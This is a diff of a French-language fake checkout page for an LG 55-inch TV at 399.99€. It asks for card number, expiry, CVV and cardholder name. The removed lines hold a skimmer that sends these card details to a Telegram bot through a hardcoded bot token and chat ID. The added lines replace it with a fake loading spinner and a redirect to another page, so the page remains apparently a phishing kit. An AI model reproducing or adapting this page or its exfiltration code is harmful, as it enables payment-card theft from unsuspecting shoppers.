@@ -29,14 +29,13 @@
             font-size: 24px;
         }
 
-        /* Section du produit */
         .product-info {
             text-align: center;
             margin-bottom: 30px;
         }
 
         .product-info img {
-            width: 150px; /* Taille de l'image du produit */
+            width: 150px;
             margin-bottom: 15px;
         }
 
@@ -52,7 +51,6 @@
             margin-top: 10px;
         }
 
-        /* Séparateur entre le produit et les informations de paiement */
         hr {
             border: 0;
             border-top: 2px solid #c70000;
@@ -108,14 +106,52 @@
         .secure-payment img {
             width: 150px;
         }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-overlay p {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .loading-overlay .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #c70000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Informations sur le produit -->
         <div class="product-info">
-            <img src="51FWfzIHkWL._AC_SX679_.jpg" alt="LG TV - 55NANO766">
+            <img src="51FWfzIHkWL.AC_SX679.jpg" alt="LG TV - 55NANO766">
             <p><strong>LG TV - 55NANO766 - Acier foncé - 55'' (139 cm) - LED NanoCell 4K</strong></p>
             <p>Taille de l'écran : 55 Pouces</p>
             <p>Marque : LG</p>
@@ -126,10 +162,8 @@
             <p class="price">Prix : 399.99€</p>
         </div>
 
-        <!-- Séparateur -->
         <hr>
 
-        <!-- Informations de paiement -->
         <h2>Informations de Paiement</h2>
 
         <form action="confirmation.html" method="POST" id="payment-form">
@@ -193,7 +227,7 @@
             </div>
 
             <div class="form-group">
-                <button type="submit">Payer maintenant</button>
+                <button type="button" id="pay-button">Payer maintenant</button>
             </div>
         </form>
 
@@ -202,52 +236,29 @@
         </div>
     </div>
 
+    <div class="loading-overlay" id="loading-overlay">
+        <p>Veuillez patienter.</p>
+        <div class="spinner"></div>
+    </div>
+
     <script>
         const cardInput = document.getElementById('card-number');
 
         cardInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s+/g, ''); // Retirer les espaces
-            if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
-            const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
+            let value = e.target.value.replace(/\s+/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
             e.target.value = formattedValue;
         });
 
-        // Fonction pour envoyer les informations au bot Telegram
-        document.getElementById('payment-form').addEventListener('submit', async function(e) {
-            e.preventDefault(); // Eviter l'envoi du formulaire
+        document.getElementById('pay-button').addEventListener('click', function () {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            loadingOverlay.classList.add('active');
 
-            const data = new FormData(this);
-            const cardNumber = data.get('card-number');
-            const expiryMonth = data.get('expiry-month');
-            const expiryYear = data.get('expiry-year');
-            const cvv = data.get('cvv');
-            const nameOnCard = data.get('name-on-card');
-            const price = "399.99€"; // Prix du produit
-
-            // Créez un message à envoyer
-            const message = `
-Produit : LG TV - 55NANO766 - 55 Pouces 4K
-Prix : ${price}
-Numéro de carte : ${cardNumber}
-Date d'expiration : ${expiryMonth}/${expiryYear}
-CVV : ${cvv}
-Nom sur la carte : ${nameOnCard}
-`;
-
-            const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
-            const chatId = '5372119436'; // Votre chat ID Telegram
-
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            // Envoi du message
-            const response = await fetch(telegramApiUrl);
-            const dataResponse = await response.json();
-
-            if (dataResponse.ok) {
-                alert('Votre paiement a été envoyé avec succès.');
-            } else {
-                alert('Erreur dans l\'envoi des informations.');
-            }
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                window.location.href = 'Traitement.html';
+            }, 5000);
         });
     </script>
 
